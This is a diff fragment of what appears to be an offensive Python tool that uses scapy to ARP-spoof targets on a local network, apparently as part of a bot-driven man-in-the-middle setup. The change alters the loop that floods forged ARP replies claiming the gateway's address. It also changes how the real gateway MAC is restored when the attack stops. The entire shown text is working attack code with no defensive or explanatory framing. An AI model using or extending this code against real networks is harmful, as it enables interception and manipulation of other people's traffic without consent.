@@ -286,12 +286,15 @@ def arpSpoof(target):
         if attackManager("isattacked", target=target[0]) == True:
             i = 0
             while i < 20:
-                sendp(ARP(op=2, psrc=gw_ip, pdst=target[0],hwdst=target[1],hwsrc=iface_mac), count=100, verbose=False)
+                sendp(ARP(op=2, psrc=gw_ip, pdst=target[0],hwdst=target[1],hwsrc=iface_mac), verbose=False)
                 i += 1
             time.sleep(2)
         else:
             print("[+] Stopping ARP Spoof for " + str(target[0]) + "...")
-            send(ARP(op=2, psrc=gw_ip, pdst=target[0],hwdst=target[1],hwsrc=gw_mac), count=100, verbose=False)
+            i = 0
+            while i < 20:
+                sendp(ARP(op=2, psrc=gw_ip, pdst=target[0],hwdst=target[1],hwsrc=gw_mac), verbose=False)
+                i += 1
             break
 
 def mitmHandler(target, ID, bot):
